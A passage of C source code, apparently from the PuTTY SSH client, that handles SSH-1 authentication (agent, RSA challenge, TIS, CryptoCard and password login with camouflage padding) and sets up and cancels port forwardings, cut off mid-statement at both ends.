agent\\r\\n\");\n\t\t\t\t    }\n\t\t\t\t    s->authed = TRUE;\n\t\t\t\t} else\n\t\t\t\t    logevent\n\t\t\t\t\t(\"Pageant's response not accepted\");\n\t\t\t    } else {\n\t\t\t\tlogevent\n\t\t\t\t    (\"Pageant failed to answer challenge\");\n\t\t\t\tsfree(ret);\n\t\t\t    }\n\t\t\t} else {\n\t\t\t    logevent(\"No reply received from Pageant\");\n\t\t\t}\n\t\t    }\n\t\t    freebn(s->key.exponent);\n\t\t    freebn(s->key.modulus);\n\t\t    freebn(s->challenge);\n\t\t    if (s->authed)\n\t\t\tbreak;\n\t\t}\n\t\tsfree(s->response);\n\t\tif (s->publickey_blob && !s->tried_publickey)\n\t\t    logevent(\"Configured key file not in Pageant\");\n\t    } else {\n                logevent(\"Failed to get reply from Pageant\");\n            }\n\t    if (s->authed)\n\t\tbreak;\n\t}\n\tif (s->publickey_blob && s->privatekey_available &&\n            !s->tried_publickey) {\n\t    /*\n\t     * Try public key authentication with the specified\n\t     * key file.\n\t     */\n\t    int got_passphrase; /* need not be kept over crReturn */\n\t    if (flags & FLAG_VERBOSE)\n\t\tc_write_str(ssh, \"Trying public key authentication.\\r\\n\");\n\t    s->keyfile = conf_get_filename(ssh->conf, CONF_keyfile);\n\t    logeventf(ssh, \"Trying public key \\\"%s\\\"\",\n\t\t      filename_to_str(s->keyfile));\n\t    s->tried_publickey = 1;\n\t    got_passphrase = FALSE;\n\t    while (!got_passphrase) {\n\t\t/*\n\t\t * Get a passphrase, if necessary.\n\t\t */\n\t\tchar *passphrase = NULL;    /* only written after crReturn */\n\t\tconst char *error;\n\t\tif (!s->privatekey_encrypted) {\n\t\t    if (flags & FLAG_VERBOSE)\n\t\t\tc_write_str(ssh, \"No passphrase required.\\r\\n\");\n\t\t    passphrase = NULL;\n\t\t} else {\n\t\t    int ret; /* need not be kept over crReturn */\n\t\t    s->cur_prompt = new_prompts(ssh->frontend);\n\t\t    s->cur_prompt->to_server = FALSE;\n\t\t    s->cur_prompt->name = dupstr(\"SSH key passphrase\");\n\t\t    add_prompt(s->cur_prompt,\n\t\t\t       dupprintf(\"Passphrase for key \\\"%.100s\\\": \",\n\t\t\t\t\t s->publickey_comment), FALSE);\n\t\t    ret = get_userpass_input(s->cur_prompt, NULL, 0);\n\t\t    while (ret < 0) {\n\t\t\tssh->send_ok = 1;\n\t\t\tcrWaitUntil(!pktin);\n\t\t\tret = get_userpass_input(s->cur_prompt, in, inlen);\n\t\t\tssh->send_ok = 0;\n\t\t    }\n\t\t    if (!ret) {\n\t\t\t/* Failed to get a passphrase. Terminate. */\n\t\t\tfree_prompts(s->cur_prompt);\n\t\t\tssh_disconnect(ssh, NULL, \"Unable to authenticate\",\n\t\t\t\t       0, TRUE);\n\t\t\tcrStop(0);\n\t\t    }\n\t\t    passphrase = dupstr(s->cur_prompt->prompts[0]->result);\n\t\t    free_prompts(s->cur_prompt);\n\t\t}\n\t\t/*\n\t\t * Try decrypting key with passphrase.\n\t\t */\n\t\ts->keyfile = conf_get_filename(ssh->conf, CONF_keyfile);\n\t\tret = loadrsakey(s->keyfile, &s->key, passphrase,\n\t\t\t\t &error);\n\t\tif (passphrase) {\n\t\t    smemclr(passphrase, strlen(passphrase));\n\t\t    sfree(passphrase);\n\t\t}\n\t\tif (ret == 1) {\n\t\t    /* Correct passphrase. */\n\t\t    got_passphrase = TRUE;\n\t\t} else if (ret == 0) {\n\t\t    c_write_str(ssh, \"Couldn't load private key from \");\n\t\t    c_write_str(ssh, filename_to_str(s->keyfile));\n\t\t    c_write_str(ssh, \" (\");\n\t\t    c_write_str(ssh, error);\n\t\t    c_write_str(ssh, \").\\r\\n\");\n\t\t    got_passphrase = FALSE;\n\t\t    break;\t       /* go and try something else */\n\t\t} else if (ret == -1) {\n\t\t    c_write_str(ssh, \"Wrong passphrase.\\r\\n\"); /* FIXME */\n\t\t    got_passphrase = FALSE;\n\t\t    /* and try again */\n\t\t} else {\n\t\t    assert(0 && \"unexpected return from loadrsakey()\");\n\t\t    got_passphrase = FALSE;   /* placate optimisers */\n\t\t}\n\t    }\n\n\t    if (got_passphrase) {\n\n\t\t/*\n\t\t * Send a public key attempt.\n\t\t */\n\t\tsend_packet(ssh, SSH1_CMSG_AUTH_RSA,\n\t\t\t    PKT_BIGNUM, s->key.modulus, PKT_END);\n\n\t\tcrWaitUntil(pktin);\n\t\tif (pktin->type == SSH1_SMSG_FAILURE) {\n\t\t    c_write_str(ssh, \"Server refused our public key.\\r\\n\");\n\t\t    continue;\t       /* go and try something else */\n\t\t}\n\t\tif (pktin->type != SSH1_SMSG_AUTH_RSA_CHALLENGE) {\n\t\t    bombout((\"Bizarre response to offer of public key\"));\n\t\t    crStop(0);\n\t\t}\n\n\t\t{\n\t\t    int i;\n\t\t    unsigned char buffer[32];\n\t\t    Bignum challenge, response;\n\n\t\t    if ((challenge = ssh1_pkt_getmp(pktin)) == NULL) {\n\t\t\tbombout((\"Server's RSA challenge was badly formatted\"));\n\t\t\tcrStop(0);\n\t\t    }\n\t\t    response = rsadecrypt(challenge, &s->key);\n\t\t    freebn(s->key.private_exponent);/* burn the evidence */\n\n\t\t    for (i = 0; i < 32; i++) {\n\t\t\tbuffer[i] = bignum_byte(response, 31 - i);\n\t\t    }\n\n\t\t    MD5Init(&md5c);\n\t\t    MD5Update(&md5c, buffer, 32);\n\t\t    MD5Update(&md5c, s->session_id, 16);\n\t\t    MD5Final(buffer, &md5c);\n\n\t\t    send_packet(ssh, SSH1_CMSG_AUTH_RSA_RESPONSE,\n\t\t\t\tPKT_DATA, buffer, 16, PKT_END);\n\n\t\t    freebn(challenge);\n\t\t    freebn(response);\n\t\t}\n\n\t\tcrWaitUntil(pktin);\n\t\tif (pktin->type == SSH1_SMSG_FAILURE) {\n\t\t    if (flags & FLAG_VERBOSE)\n\t\t\tc_write_str(ssh, \"Failed to authenticate with\"\n\t\t\t\t    \" our public key.\\r\\n\");\n\t\t    continue;\t       /* go and try something else */\n\t\t} else if (pktin->type != SSH1_SMSG_SUCCESS) {\n\t\t    bombout((\"Bizarre response to RSA authentication response\"));\n\t\t    crStop(0);\n\t\t}\n\n\t\tbreak;\t\t       /* we're through! */\n\t    }\n\n\t}\n\n\t/*\n\t * Otherwise, try various forms of password-like authentication.\n\t */\n\ts->cur_prompt = new_prompts(ssh->frontend);\n\n\tif (conf_get_int(ssh->conf, CONF_try_tis_auth) &&\n\t    (s->supported_auths_mask & (1 << SSH1_AUTH_TIS)) &&\n\t    !s->tis_auth_refused) {\n\t    s->pwpkt_type = SSH1_CMSG_AUTH_TIS_RESPONSE;\n\t    logevent(\"Requested TIS authentication\");\n\t    send_packet(ssh, SSH1_CMSG_AUTH_TIS, PKT_END);\n\t    crWaitUntil(pktin);\n\t    if (pktin->type != SSH1_SMSG_AUTH_TIS_CHALLENGE) {\n\t\tlogevent(\"TIS authentication declined\");\n\t\tif (flags & FLAG_INTERACTIVE)\n\t\t    c_write_str(ssh, \"TIS authentication refused.\\r\\n\");\n\t\ts->tis_auth_refused = 1;\n\t\tcontinue;\n\t    } else {\n\t\tchar *challenge;\n\t\tint challengelen;\n\t\tchar *instr_suf, *prompt;\n\n\t\tssh_pkt_getstring(pktin, &challenge, &challengelen);\n\t\tif (!challenge) {\n\t\t    bombout((\"TIS challenge packet was badly formed\"));\n\t\t    crStop(0);\n\t\t}\n\t\tlogevent(\"Received TIS challenge\");\n\t\ts->cur_prompt->to_server = TRUE;\n\t\ts->cur_prompt->name = dupstr(\"SSH TIS authentication\");\n\t\t/* Prompt heuristic comes from OpenSSH */\n\t\tif (memchr(challenge, '\\n', challengelen)) {\n\t\t    instr_suf = dupstr(\"\");\n\t\t    prompt = dupprintf(\"%.*s\", challengelen, challenge);\n\t\t} else {\n\t\t    instr_suf = dupprintf(\"%.*s\", challengelen, challenge);\n\t\t    prompt = dupstr(\"Response: \");\n\t\t}\n\t\ts->cur_prompt->instruction =\n\t\t    dupprintf(\"Using TIS authentication.%s%s\",\n\t\t\t      (*instr_suf) ? \"\\n\" : \"\",\n\t\t\t      instr_suf);\n\t\ts->cur_prompt->instr_reqd = TRUE;\n\t\tadd_prompt(s->cur_prompt, prompt, FALSE);\n\t\tsfree(instr_suf);\n\t    }\n\t}\n\tif (conf_get_int(ssh->conf, CONF_try_tis_auth) &&\n\t    (s->supported_auths_mask & (1 << SSH1_AUTH_CCARD)) &&\n\t    !s->ccard_auth_refused) {\n\t    s->pwpkt_type = SSH1_CMSG_AUTH_CCARD_RESPONSE;\n\t    logevent(\"Requested CryptoCard authentication\");\n\t    send_packet(ssh, SSH1_CMSG_AUTH_CCARD, PKT_END);\n\t    crWaitUntil(pktin);\n\t    if (pktin->type != SSH1_SMSG_AUTH_CCARD_CHALLENGE) {\n\t\tlogevent(\"CryptoCard authentication declined\");\n\t\tc_write_str(ssh, \"CryptoCard authentication refused.\\r\\n\");\n\t\ts->ccard_auth_refused = 1;\n\t\tcontinue;\n\t    } else {\n\t\tchar *challenge;\n\t\tint challengelen;\n\t\tchar *instr_suf, *prompt;\n\n\t\tssh_pkt_getstring(pktin, &challenge, &challengelen);\n\t\tif (!challenge) {\n\t\t    bombout((\"CryptoCard challenge packet was badly formed\"));\n\t\t    crStop(0);\n\t\t}\n\t\tlogevent(\"Received CryptoCard challenge\");\n\t\ts->cur_prompt->to_server = TRUE;\n\t\ts->cur_prompt->name = dupstr(\"SSH CryptoCard authentication\");\n\t\ts->cur_prompt->name_reqd = FALSE;\n\t\t/* Prompt heuristic comes from OpenSSH */\n\t\tif (memchr(challenge, '\\n', challengelen)) {\n\t\t    instr_suf = dupstr(\"\");\n\t\t    prompt = dupprintf(\"%.*s\", challengelen, challenge);\n\t\t} else {\n\t\t    instr_suf = dupprintf(\"%.*s\", challengelen, challenge);\n\t\t    prompt = dupstr(\"Response: \");\n\t\t}\n\t\ts->cur_prompt->instruction =\n\t\t    dupprintf(\"Using CryptoCard authentication.%s%s\",\n\t\t\t      (*instr_suf) ? \"\\n\" : \"\",\n\t\t\t      instr_suf);\n\t\ts->cur_prompt->instr_reqd = TRUE;\n\t\tadd_prompt(s->cur_prompt, prompt, FALSE);\n\t\tsfree(instr_suf);\n\t    }\n\t}\n\tif (s->pwpkt_type == SSH1_CMSG_AUTH_PASSWORD) {\n\t    if ((s->supported_auths_mask & (1 << SSH1_AUTH_PASSWORD)) == 0) {\n\t\tbombout((\"No supported authentication methods available\"));\n\t\tcrStop(0);\n\t    }\n\t    s->cur_prompt->to_server = TRUE;\n\t    s->cur_prompt->name = dupstr(\"SSH password\");\n\t    add_prompt(s->cur_prompt, dupprintf(\"%s@%s's password: \",\n\t\t\t\t\t\tssh->username, ssh->savedhost),\n\t\t       FALSE);\n\t}\n\n\t/*\n\t * Show password prompt, having first obtained it via a TIS\n\t * or CryptoCard exchange if we're doing TIS or CryptoCard\n\t * authentication.\n\t */\n\t{\n\t    int ret; /* need not be kept over crReturn */\n\t    ret = get_userpass_input(s->cur_prompt, NULL, 0);\n\t    while (ret < 0) {\n\t\tssh->send_ok = 1;\n\t\tcrWaitUntil(!pktin);\n\t\tret = get_userpass_input(s->cur_prompt, in, inlen);\n\t\tssh->send_ok = 0;\n\t    }\n\t    if (!ret) {\n\t\t/*\n\t\t * Failed to get a password (for example\n\t\t * because one was supplied on the command line\n\t\t * which has already failed to work). Terminate.\n\t\t */\n\t\tfree_prompts(s->cur_prompt);\n\t\tssh_disconnect(ssh, NULL, \"Unable to authenticate\", 0, TRUE);\n\t\tcrStop(0);\n\t    }\n\t}\n\n\tif (s->pwpkt_type == SSH1_CMSG_AUTH_PASSWORD) {\n\t    /*\n\t     * Defence against traffic analysis: we send a\n\t     * whole bunch of packets containing strings of\n\t     * different lengths. One of these strings is the\n\t     * password, in a SSH1_CMSG_AUTH_PASSWORD packet.\n\t     * The others are all random data in\n\t     * SSH1_MSG_IGNORE packets. This way a passive\n\t     * listener can't tell which is the password, and\n\t     * hence can't deduce the password length.\n\t     * \n\t     * Anybody with a password length greater than 16\n\t     * bytes is going to have enough entropy in their\n\t     * password that a listener won't find it _that_\n\t     * much help to know how long it is. So what we'll\n\t     * do is:\n\t     * \n\t     *  - if password length < 16, we send 15 packets\n\t     *    containing string lengths 1 through 15\n\t     * \n\t     *  - otherwise, we let N be the nearest multiple\n\t     *    of 8 below the password length, and send 8\n\t     *    packets containing string lengths N through\n\t     *    N+7. This won't obscure the order of\n\t     *    magnitude of the password length, but it will\n\t     *    introduce a bit of extra uncertainty.\n\t     * \n\t     * A few servers can't deal with SSH1_MSG_IGNORE, at\n\t     * least in this context. For these servers, we need\n\t     * an alternative defence. We make use of the fact\n\t     * that the password is interpreted as a C string:\n\t     * so we can append a NUL, then some random data.\n\t     * \n\t     * A few servers can deal with neither SSH1_MSG_IGNORE\n\t     * here _nor_ a padded password string.\n\t     * For these servers we are left with no defences\n\t     * against password length sniffing.\n\t     */\n\t    if (!(ssh->remote_bugs & BUG_CHOKES_ON_SSH1_IGNORE) &&\n\t        !(ssh->remote_bugs & BUG_NEEDS_SSH1_PLAIN_PASSWORD)) {\n\t\t/*\n\t\t * The server can deal with SSH1_MSG_IGNORE, so\n\t\t * we can use the primary defence.\n\t\t */\n\t\tint bottom, top, pwlen, i;\n\t\tchar *randomstr;\n\n\t\tpwlen = strlen(s->cur_prompt->prompts[0]->result);\n\t\tif (pwlen < 16) {\n\t\t    bottom = 0;    /* zero length passwords are OK! :-) */\n\t\t    top = 15;\n\t\t} else {\n\t\t    bottom = pwlen & ~7;\n\t\t    top = bottom + 7;\n\t\t}\n\n\t\tassert(pwlen >= bottom && pwlen <= top);\n\n\t\trandomstr = snewn(top + 1, char);\n\n\t\tfor (i = bottom; i <= top; i++) {\n\t\t    if (i == pwlen) {\n\t\t\tdefer_packet(ssh, s->pwpkt_type,\n                                     PKT_STR,s->cur_prompt->prompts[0]->result,\n\t\t\t\t     PKT_END);\n\t\t    } else {\n\t\t\tfor (j = 0; j < i; j++) {\n\t\t\t    do {\n\t\t\t\trandomstr[j] = random_byte();\n\t\t\t    } while (randomstr[j] == '\\0');\n\t\t\t}\n\t\t\trandomstr[i] = '\\0';\n\t\t\tdefer_packet(ssh, SSH1_MSG_IGNORE,\n\t\t\t\t     PKT_STR, randomstr, PKT_END);\n\t\t    }\n\t\t}\n\t\tlogevent(\"Sending password with camouflage packets\");\n\t\tssh_pkt_defersend(ssh);\n\t\tsfree(randomstr);\n\t    } \n\t    else if (!(ssh->remote_bugs & BUG_NEEDS_SSH1_PLAIN_PASSWORD)) {\n\t\t/*\n\t\t * The server can't deal with SSH1_MSG_IGNORE\n\t\t * but can deal with padded passwords, so we\n\t\t * can use the secondary defence.\n\t\t */\n\t\tchar string[64];\n\t\tchar *ss;\n\t\tint len;\n\n\t\tlen = strlen(s->cur_prompt->prompts[0]->result);\n\t\tif (len < sizeof(string)) {\n\t\t    ss = string;\n\t\t    strcpy(string, s->cur_prompt->prompts[0]->result);\n\t\t    len++;\t       /* cover the zero byte */\n\t\t    while (len < sizeof(string)) {\n\t\t\tstring[len++] = (char) random_byte();\n\t\t    }\n\t\t} else {\n\t\t    ss = s->cur_prompt->prompts[0]->result;\n\t\t}\n\t\tlogevent(\"Sending length-padded password\");\n\t\tsend_packet(ssh, s->pwpkt_type,\n\t\t\t    PKT_INT, len, PKT_DATA, ss, len,\n\t\t\t    PKT_END);\n\t    } else {\n\t\t/*\n\t\t * The server is believed unable to cope with\n\t\t * any of our password camouflage methods.\n\t\t */\n\t\tint len;\n\t\tlen = strlen(s->cur_prompt->prompts[0]->result);\n\t\tlogevent(\"Sending unpadded password\");\n\t\tsend_packet(ssh, s->pwpkt_type,\n                            PKT_INT, len,\n\t\t\t    PKT_DATA, s->cur_prompt->prompts[0]->result, len,\n\t\t\t    PKT_END);\n\t    }\n\t} else {\n\t    send_packet(ssh, s->pwpkt_type,\n\t\t\tPKT_STR, s->cur_prompt->prompts[0]->result,\n\t\t\tPKT_END);\n\t}\n\tlogevent(\"Sent password\");\n\tfree_prompts(s->cur_prompt);\n\tcrWaitUntil(pktin);\n\tif (pktin->type == SSH1_SMSG_FAILURE) {\n\t    if (flags & FLAG_VERBOSE)\n\t\tc_write_str(ssh, \"Access denied\\r\\n\");\n\t    logevent(\"Authentication refused\");\n\t} else if (pktin->type != SSH1_SMSG_SUCCESS) {\n\t    bombout((\"Strange packet received, type %d\", pktin->type));\n\t    crStop(0);\n\t}\n    }\n\n    /* Clear up */\n    if (s->publickey_blob) {\n\tsfree(s->publickey_blob);\n\tsfree(s->publickey_comment);\n    }\n\n    logevent(\"Authentication successful\");\n\n    crFinish(1);\n}\n\nstatic void ssh_channel_try_eof(struct ssh_channel *c)\n{\n    Ssh ssh = c->ssh;\n    assert(c->pending_eof);          /* precondition for calling us */\n    if (c->halfopen)\n        return;                 /* can't close: not even opened yet */\n    if (ssh->version == 2 && bufchain_size(&c->v.v2.outbuffer) > 0)\n        return;              /* can't send EOF: pending outgoing data */\n\n    c->pending_eof = FALSE;            /* we're about to send it */\n    if (ssh->version == 1) {\n        send_packet(ssh, SSH1_MSG_CHANNEL_CLOSE, PKT_INT, c->remoteid,\n                    PKT_END);\n        c->closes |= CLOSES_SENT_EOF;\n    } else {\n        struct Packet *pktout;\n        pktout = ssh2_pkt_init(SSH2_MSG_CHANNEL_EOF);\n        ssh2_pkt_adduint32(pktout, c->remoteid);\n        ssh2_pkt_send(ssh, pktout);\n        c->closes |= CLOSES_SENT_EOF;\n\tssh2_channel_check_close(c);\n    }\n}\n\nConf *sshfwd_get_conf(struct ssh_channel *c)\n{\n    Ssh ssh = c->ssh;\n    return ssh->conf;\n}\n\nvoid sshfwd_write_eof(struct ssh_channel *c)\n{\n    Ssh ssh = c->ssh;\n\n    if (ssh->state == SSH_STATE_CLOSED)\n\treturn;\n\n    if (c->closes & CLOSES_SENT_EOF)\n        return;\n\n    c->pending_eof = TRUE;\n    ssh_channel_try_eof(c);\n}\n\nvoid sshfwd_unclean_close(struct ssh_channel *c, const char *err)\n{\n    Ssh ssh = c->ssh;\n    char *reason;\n\n    if (ssh->state == SSH_STATE_CLOSED)\n\treturn;\n\n    reason = dupprintf(\"due to local error: %s\", err);\n    ssh_channel_close_local(c, reason);\n    sfree(reason);\n    c->pending_eof = FALSE;   /* this will confuse a zombie channel */\n\n    ssh2_channel_check_close(c);\n}\n\nint sshfwd_write(struct ssh_channel *c, char *buf, int len)\n{\n    Ssh ssh = c->ssh;\n\n    if (ssh->state == SSH_STATE_CLOSED)\n\treturn 0;\n\n    return ssh_send_channel_data(c, buf, len);\n}\n\nvoid sshfwd_unthrottle(struct ssh_channel *c, int bufsize)\n{\n    Ssh ssh = c->ssh;\n\n    if (ssh->state == SSH_STATE_CLOSED)\n\treturn;\n\n    ssh_channel_unthrottle(c, bufsize);\n}\n\nstatic void ssh_queueing_handler(Ssh ssh, struct Packet *pktin)\n{\n    struct queued_handler *qh = ssh->qhead;\n\n    assert(qh != NULL);\n\n    assert(pktin->type == qh->msg1 || pktin->type == qh->msg2);\n\n    if (qh->msg1 > 0) {\n\tassert(ssh->packet_dispatch[qh->msg1] == ssh_queueing_handler);\n\tssh->packet_dispatch[qh->msg1] = ssh->q_saved_handler1;\n    }\n    if (qh->msg2 > 0) {\n\tassert(ssh->packet_dispatch[qh->msg2] == ssh_queueing_handler);\n\tssh->packet_dispatch[qh->msg2] = ssh->q_saved_handler2;\n    }\n\n    if (qh->next) {\n\tssh->qhead = qh->next;\n\n\tif (ssh->qhead->msg1 > 0) {\n\t    ssh->q_saved_handler1 = ssh->packet_dispatch[ssh->qhead->msg1];\n\t    ssh->packet_dispatch[ssh->qhead->msg1] = ssh_queueing_handler;\n\t}\n\tif (ssh->qhead->msg2 > 0) {\n\t    ssh->q_saved_handler2 = ssh->packet_dispatch[ssh->qhead->msg2];\n\t    ssh->packet_dispatch[ssh->qhead->msg2] = ssh_queueing_handler;\n\t}\n    } else {\n\tssh->qhead = ssh->qtail = NULL;\n    }\n\n    qh->handler(ssh, pktin, qh->ctx);\n\n    sfree(qh);\n}\n\nstatic void ssh_queue_handler(Ssh ssh, int msg1, int msg2,\n\t\t\t      chandler_fn_t handler, void *ctx)\n{\n    struct queued_handler *qh;\n\n    qh = snew(struct queued_handler);\n    qh->msg1 = msg1;\n    qh->msg2 = msg2;\n    qh->handler = handler;\n    qh->ctx = ctx;\n    qh->next = NULL;\n\n    if (ssh->qtail == NULL) {\n\tssh->qhead = qh;\n\n\tif (qh->msg1 > 0) {\n\t    ssh->q_saved_handler1 = ssh->packet_dispatch[ssh->qhead->msg1];\n\t    ssh->packet_dispatch[qh->msg1] = ssh_queueing_handler;\n\t}\n\tif (qh->msg2 > 0) {\n\t    ssh->q_saved_handler2 = ssh->packet_dispatch[ssh->qhead->msg2];\n\t    ssh->packet_dispatch[qh->msg2] = ssh_queueing_handler;\n\t}\n    } else {\n\tssh->qtail->next = qh;\n    }\n    ssh->qtail = qh;\n}\n\nstatic void ssh_rportfwd_succfail(Ssh ssh, struct Packet *pktin, void *ctx)\n{\n    struct ssh_rportfwd *rpf, *pf = (struct ssh_rportfwd *)ctx;\n\n    if (pktin->type == (ssh->version == 1 ? SSH1_SMSG_SUCCESS :\n\t\t\tSSH2_MSG_REQUEST_SUCCESS)) {\n\tlogeventf(ssh, \"Remote port forwarding from %s enabled\",\n\t\t  pf->sportdesc);\n    } else {\n\tlogeventf(ssh, \"Remote port forwarding from %s refused\",\n\t\t  pf->sportdesc);\n\n\trpf = del234(ssh->rportfwds, pf);\n\tassert(rpf == pf);\n\tpf->pfrec->remote = NULL;\n\tfree_rportfwd(pf);\n    }\n}\n\nint ssh_alloc_sharing_rportfwd(Ssh ssh, const char *shost, int sport,\n                               void *share_ctx)\n{\n    struct ssh_rportfwd *pf = snew(struct ssh_rportfwd);\n    pf->dhost = NULL;\n    pf->dport = 0;\n    pf->share_ctx = share_ctx;\n    pf->shost = dupstr(shost);\n    pf->sport = sport;\n    pf->sportdesc = NULL;\n    if (!ssh->rportfwds) {\n        assert(ssh->version == 2);\n        ssh->rportfwds = newtree234(ssh_rportcmp_ssh2);\n    }\n    if (add234(ssh->rportfwds, pf) != pf) {\n        sfree(pf->shost);\n        sfree(pf);\n        return FALSE;\n    }\n    return TRUE;\n}\n\nstatic void ssh_sharing_global_request_response(Ssh ssh, struct Packet *pktin,\n                                                void *ctx)\n{\n    share_got_pkt_from_server(ctx, pktin->type,\n                              pktin->body, pktin->length);\n}\n\nvoid ssh_sharing_queue_global_request(Ssh ssh, void *share_ctx)\n{\n    ssh_queue_handler(ssh, SSH2_MSG_REQUEST_SUCCESS, SSH2_MSG_REQUEST_FAILURE,\n                      ssh_sharing_global_request_response, share_ctx);\n}\n\nstatic void ssh_setup_portfwd(Ssh ssh, Conf *conf)\n{\n    struct ssh_portfwd *epf;\n    int i;\n    char *key, *val;\n\n    if (!ssh->portfwds) {\n\tssh->portfwds = newtree234(ssh_portcmp);\n    } else {\n\t/*\n\t * Go through the existing port forwardings and tag them\n\t * with status==DESTROY. Any that we want to keep will be\n\t * re-enabled (status==KEEP) as we go through the\n\t * configuration and find out which bits are the same as\n\t * they were before.\n\t */\n\tstruct ssh_portfwd *epf;\n\tint i;\n\tfor (i = 0; (epf = index234(ssh->portfwds, i)) != NULL; i++)\n\t    epf->status = DESTROY;\n    }\n\n    for (val = conf_get_str_strs(conf, CONF_portfwd, NULL, &key);\n\t val != NULL;\n\t val = conf_get_str_strs(conf, CONF_portfwd, key, &key)) {\n\tchar *kp, *kp2, *vp, *vp2;\n\tchar address_family, type;\n\tint sport,dport,sserv,dserv;\n\tchar *sports, *dports, *saddr, *host;\n\n\tkp = key;\n\n\taddress_family = 'A';\n\ttype = 'L';\n\tif (*kp == 'A' || *kp == '4' || *kp == '6')\n\t    address_family = *kp++;\n\tif (*kp == 'L' || *kp == 'R')\n\t    type = *kp++;\n\n\tif ((kp2 = host_strchr(kp, ':')) != NULL) {\n\t    /*\n\t     * There's a colon in the middle of the source port\n\t     * string, which means that the part before it is\n\t     * actually a source address.\n\t     */\n\t    char *saddr_tmp = dupprintf(\"%.*s\", (int)(kp2 - kp), kp);\n            saddr = host_strduptrim(saddr_tmp);\n            sfree(saddr_tmp);\n\t    sports = kp2+1;\n\t} else {\n\t    saddr = NULL;\n\t    sports = kp;\n\t}\n\tsport = atoi(sports);\n\tsserv = 0;\n\tif (sport == 0) {\n\t    sserv = 1;\n\t    sport = net_service_lookup(sports);\n\t    if (!sport) {\n\t\tlogeventf(ssh, \"Service lookup failed for source\"\n\t\t\t  \" port \\\"%s\\\"\", sports);\n\t    }\n\t}\n\n\tif (type == 'L' && !strcmp(val, \"D\")) {\n            /* dynamic forwarding */\n\t    host = NULL;\n\t    dports = NULL;\n\t    dport = -1;\n\t    dserv = 0;\n            type = 'D';\n        } else {\n            /* ordinary forwarding */\n\t    vp = val;\n\t    vp2 = vp + host_strcspn(vp, \":\");\n\t    host = dupprintf(\"%.*s\", (int)(vp2 - vp), vp);\n\t    if (*vp2)\n\t\tvp2++;\n\t    dports = vp2;\n\t    dport = atoi(dports);\n\t    dserv = 0;\n\t    if (dport == 0) {\n\t\tdserv = 1;\n\t\tdport = net_service_lookup(dports);\n\t\tif (!dport) {\n\t\t    logeventf(ssh, \"Service lookup failed for destination\"\n\t\t\t      \" port \\\"%s\\\"\", dports);\n\t\t}\n\t    }\n\t}\n\n\tif (sport && dport) {\n\t    /* Set up a description of the source port. */\n\t    struct ssh_portfwd *pfrec, *epfrec;\n\n\t    pfrec = snew(struct ssh_portfwd);\n\t    pfrec->type = type;\n\t    pfrec->saddr = saddr;\n\t    pfrec->sserv = sserv ? dupstr(sports) : NULL;\n\t    pfrec->sport = sport;\n\t    pfrec->daddr = host;\n\t    pfrec->dserv = dserv ? dupstr(dports) : NULL;\n\t    pfrec->dport = dport;\n\t    pfrec->local = NULL;\n\t    pfrec->remote = NULL;\n\t    pfrec->addressfamily = (address_family == '4' ? ADDRTYPE_IPV4 :\n\t\t\t\t    address_family == '6' ? ADDRTYPE_IPV6 :\n\t\t\t\t    ADDRTYPE_UNSPEC);\n\n\t    epfrec = add234(ssh->portfwds, pfrec);\n\t    if (epfrec != pfrec) {\n\t\tif (epfrec->status == DESTROY) {\n\t\t    /*\n\t\t     * We already have a port forwarding up and running\n\t\t     * with precisely these parameters. Hence, no need\n\t\t     * to do anything; simply re-tag the existing one\n\t\t     * as KEEP.\n\t\t     */\n\t\t    epfrec->status = KEEP;\n\t\t}\n\t\t/*\n\t\t * Anything else indicates that there was a duplicate\n\t\t * in our input, which we'll silently ignore.\n\t\t */\n\t\tfree_portfwd(pfrec);\n\t    } else {\n\t\tpfrec->status = CREATE;\n\t    }\n\t} else {\n\t    sfree(saddr);\n\t    sfree(host);\n\t}\n    }\n\n    /*\n     * Now go through and destroy any port forwardings which were\n     * not re-enabled.\n     */\n    for (i = 0; (epf = index234(ssh->portfwds, i)) != NULL; i++)\n\tif (epf->status == DESTROY) {\n\t    char *message;\n\n\t    message = dupprintf(\"%s port forwarding from %s%s%d\",\n\t\t\t\tepf->type == 'L' ? \"local\" :\n\t\t\t\tepf->type == 'R' ? \"remote\" : \"dynamic\",\n\t\t\t\tepf->saddr ? epf->saddr : \"\",\n\t\t\t\tepf->saddr ? \":\" : \"\",\n\t\t\t\tepf->sport);\n\n\t    if (epf->type != 'D') {\n\t\tchar *msg2 = dupprintf(\"%s to %s:%d\", message,\n\t\t\t\t       epf->daddr, epf->dport);\n\t\tsfree(message);\n\t\tmessage = msg2;\n\t    }\n\n\t    logeventf(ssh, \"Cancelling %s\", message);\n\t    sfree(message);\n\n\t    /* epf->remote or epf->local may be NULL if setting up a\n\t     * forwarding failed. */\n\t    if (epf->remote) {\n\t\tstruct ssh_rportfwd *rpf = epf->remote;\n\t\tstruct Packet *pktout;\n\n\t\t/*\n\t\t * Cancel the port forwarding at the server\n\t\t * end.\n\t\t */\n\t\tif (ssh->version == 1) {\n\t\t    /*\n\t\t     * We cannot cancel listening ports on the\n\t\t     * server side in SSH-1! There's no message\n\t\t     * to support it. Instead, we simply remove\n\t\t     * the rportfwd record from the local end\n\t\t     * so that any connections the server tries\n\t\t     * to make on it are rejected.\n\t\t     */\n\t\t} else {\n\t\t    pktout = ssh2_pkt_init(SSH2_MSG_GLOBAL_REQUEST);\n\t\t    ssh2_pkt_addstring(pktout, \"cancel-tcpip-forward\");\n\t\t    ssh2_pkt_addbool(pktout, 0);/* _don't_ want reply */\n\t\t    if (epf->saddr) {\n\t\t\tssh2_pkt_addstring(pktout, epf->saddr);\n\t\t    } else if (conf_get_int(conf, CONF_rport_acceptall)) {\n\t\t\t/* XXX: rport_acceptall may not represent\n\t\t\t * what was used to open the original connection,\n\t\t\t * since it's reconfigurable. */\n\t\t\tssh2_pkt_addstring(pktout, \"\");\n\t\t    } else {\n\t\t\tssh2_pkt_addstring(pktout, \"localhost\");\n\t\t    }\n\t\t    ssh2_pkt_adduint32(pktout, epf->sport);\n\t\t    ssh2_pkt_send(ssh, pktout);\n\t\t}\n\n\t\tdel234(ssh->rportfwds, rpf);\n\t\tfree_rportfwd(rpf);\n\t    } else if (epf->local) {\n\t\tpfl_terminate(epf->local);\n\t    }\n\n\t    delpos234(ssh->portfwds, i);\n\t    free_portfwd(epf);\n\t    i--;\t\t       /* so we don't skip one in the list */\n\t}\n\n    /*\n     * And finally, set up any new port forwardings (status==CREATE).\n     */\n    for (i = 0; (epf = index234(ssh->portfwds, i)) != NULL; i++)\n\tif (epf->status == CREATE) {\n\t    char *sportdesc, *dportdesc;\n\t    sportdesc = dupprintf(\"%s%s%s%s%d%s\",\n\t\t\t\t  epf->saddr 